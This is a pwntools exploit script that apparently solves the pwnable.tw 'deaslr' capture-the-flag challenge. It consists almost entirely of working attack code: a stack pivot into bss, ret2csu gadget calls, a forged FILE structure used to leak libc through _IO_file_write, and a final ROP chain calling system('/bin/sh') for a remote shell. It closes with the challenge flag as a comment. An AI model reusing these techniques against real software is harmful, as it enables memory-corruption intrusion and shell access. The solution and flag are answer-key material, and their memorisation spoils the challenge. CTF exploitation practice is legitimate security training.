#!/usr/bin/env python3
from pwn import *

# Pwntools custom functions
context.terminal = ['tmux', 'split', '-h']
def _snd(s):
  io.send(bytes(s))
def _sndl(s):
  io.sendline(bytes(s))
def _snda(a,s):
  io.sendafter(bytes(a),bytes(s))
def _sndal(a,s):
  io.sendlineafter(bytes(a),bytes(s))
def _rcvu(s):
  return io.recvuntil(bytes(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)

exe = context.binary = ELF('deaslr')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10402)
env = {'LD_PRELOAD': './libc_64.so.6'}

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
#break *0x400554
#break *0x4005A0
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# rbx, rbp, r12-15
csu_pop_gadget = 0x4005BA
# rdx = r13, rsi = r14, edi = r15d
# call    qword ptr [r12+rbx*8]
csu_call_gadget = 0x4005A0
def csu_pop(rop, rbx = 0, rbp = 1, r12 = 0, r13 = 0, r14 = 0, r15 = 0):
    rop.raw(csu_pop_gadget)
    rop.raw(rbx)
    rop.raw(rbp)
    rop.raw(r12)
    rop.raw(r13)
    rop.raw(r14)
    rop.raw(r15)

def csu_call(rop, ptr_to_func, args = [], args2 = []):
    if len(args) > 0:
        args = args[::-1]
        csu_pop(rop, rbx = 0, rbp = 1,
            r12 = ptr_to_func,
            r13 = args[0] if len(args) > 0 else 0,
            r14 = args[1] if len(args) > 1 else 0,
            r15 = args[2] if len(args) > 2 else 0)

    rop.raw(csu_call_gadget)

    # add rsp, 8
    # pop rbx, rbp, r12-15
    if len(args2) > 0:
        csu_pop(rop, rbx = 0, rbp = 1,
            r12 = ptr_to_func,
            r13 = args2[0] if len(args2) > 0 else 0,
            r14 = args2[1] if len(args2) > 1 else 0,
            r15 = args2[2] if len(args2) > 2 else 0)

# fake FILE structure
def make_file(d):
    def c(d, k):
        if k in d:
            return d[k]
        if k == 'flags':
            return 0xfbad2084
        return 0

    return b''.join([pack(c(d, 'flags')),
        pack(c(d, 'read_ptr')),
        pack(c(d, 'read_end')),
        pack(c(d, 'read_base')),
        pack(c(d, 'write_base')),
        pack(c(d, 'write_ptr')),
        pack(c(d, 'write_end')),
        pack(c(d, 'buf_base')),
        pack(c(d, 'buf_end')),
        pack(c(d, 'save_base')),
        pack(c(d, 'backup_base')),
        pack(c(d, 'save_end')),
        pack(c(d, 'markers')),
        pack(c(d, 'chain')),
        p32(c(d, 'fileno')),
        p32(c(d, 'flags2')),
        p32(c(d, 'old_offset')),
        p16(c(d, 'cur_column')),
        p8(c(d, 'vtable_offset')),
        p8(c(d, 'shortbuf')),
        pack(c(d, 'lock'))])

# memory
bss_stack = 0x601500
bss_second_stack = 0x601800
bss_file  = 0x601600
bss_libc_leak = 0x6014a0
# offset from the libc leaked pointer to the pointer of _IO_file_write
off_to_target = 0x6a663

# gadgets
ret = 0x4003f9
leave_ret = 0x400554
add_rsp_8 = 0x4003f5
pop_rbp = 0x4004a0
pop_rdi = 0x4005c3

# stage 1 - move the stack to bss
rop = ROP(exe)
rop.gets(bss_stack)
rop.raw(pop_rbp)
rop.raw(bss_stack)
rop.raw(leave_ret)

log.info(rop.dump())
rop = rop.chain()

rip_off = cyclic_find(b'gaaa')
_sndl(b"A" * rip_off + rop)

# stage 2 - call gets and move the stack to a new position
rop = ROP(exe)
rop.raw(0xdeadbeef) # rbp
rop.gets(bss_second_stack)
rop.gets(bss_file)
rop.gets(bss_libc_leak - 24)
rop.gets(bss_libc_leak + 8)
rop.raw(pop_rbp)
rop.raw(bss_second_stack)
rop.raw(leave_ret)
rop.raw(0xdeadbeef)

log.info(rop.dump())
rop = rop.chain()

_sndl(rop)

# stage 3 - deploy the fake file structure and the csu frame

# second stack
rop = ROP(exe)
rop.raw(0xdeadbeef)
rop.gets(bss_stack)
rop.raw(pop_rbp)
rop.raw(bss_libc_leak - 32)
rop.raw(leave_ret)
rop.raw(0xdeadbeef)

log.info(rop.dump())
rop = rop.chain()

_sndl(rop)

# fake file
fake_file = make_file({'fileno': 1})
_sndl(fake_file)

rbx = off_to_target
rbp = rbx + 1
_sndl(pack(csu_pop_gadget) + pack(rbx) + pack(rbp))

# _IO_new_file_write (FILE *f, const void *data, ssize_t n)
r15 = bss_file
r14 = exe.got['gets']
r13 = 8
_sndl(pack(r13) + pack(r14) + pack(r15) + pack(csu_call_gadget))

# stage 4 - control execution again after the leak
rop = ROP(exe)
rop.gets(bss_stack + 0x18)
rop.raw(0xcafebabe)

_sndl(rop)

if args.GDB:
    _rcvu('\n')

addr = _rcvn(8).strip()
addr = unpack(addr) - 0x6ed80
libc = ELF('./libc_64.so.6')
libc.address = addr
log.success('libc: {}'.format(hex(addr)))

# stage 5 - get shell
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

log.info(rop.dump())
rop = rop.chain()

_sndl(rop)

# FLAG{R0P_H4rd_TO_D3F3AT_ASLR}

io.interactive()

